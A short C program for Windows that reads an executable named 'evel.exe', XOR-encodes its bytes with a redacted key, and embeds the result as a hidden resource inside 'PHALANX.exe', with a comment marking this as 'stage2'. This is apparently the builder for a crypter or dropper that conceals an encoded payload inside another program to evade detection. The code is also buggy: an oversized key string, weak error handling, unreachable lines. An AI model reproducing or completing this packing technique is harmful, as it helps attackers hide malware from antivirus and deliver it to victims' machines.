#include <windows.h>
#include <stdio.h>
int main() {
        HANDLE hResourceFile = CreateFileW(
            L"evel.exe",
            GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hResourceFile == INVALID_HANDLE_VALUE) {
            printf("we DONT have a handle");
        }
        DWORD filesize = GetFileSize(hResourceFile, NULL);
        if (!filesize) {
            printf("Cannot calculate fileszie");
        }
        LPVOID lpResourceBuffer = VirtualAlloc( // alocate size amount of bytes
            NULL,
            filesize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpResourceBuffer) {
            printf("allocation failed");
        }
        if (ReadFile( // read file into virtual memory
            hResourceFile,
            lpResourceBuffer,
            filesize,
            NULL,
            NULL
        )) {
            printf("reading the content succesfully..");
        };
        
        BYTE* temp = (BYTE*)lpResourceBuffer;

        DWORD i;
        for (i = 0; i < filesize; i++) {
            TCHAR key[8] = L"REMOVED_FOR_SECURITY_PURPOSES";
            BYTE each = *temp;
            if (each != 0 && each != key[i%6]) {
                *temp = each ^ key[i%6];
            }
            temp++;
        }
        // stage2
        HANDLE hUpdate = BeginUpdateResourceW(
            L"PHALANX.exe",
            FALSE
        );
        if (!hUpdate || hUpdate == INVALID_HANDLE_VALUE) {
            VirtualFree(lpResourceBuffer, filesize, MEM_FREE);
            printf("BeginUpdateResourceA fails.\n");
            return -1;
        }
        if (!UpdateResourceW(
            hUpdate,
            L"UNKNOWN",
            MAKEINTRESOURCE(69),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
            lpResourceBuffer,
            filesize
        )) {
            VirtualFree(lpResourceBuffer, filesize, MEM_FREE);
            printf("UpdateResourceW fails\n");
            return -1;
        }
        if (!EndUpdateResourceW(
            hUpdate,
            FALSE
        )) {
            VirtualFree(lpResourceBuffer, filesize, MEM_FREE);
            printf("EndUpdateResourceA fails\n");
            return -1;
            printf("%d", GetLastError());
        }
    }
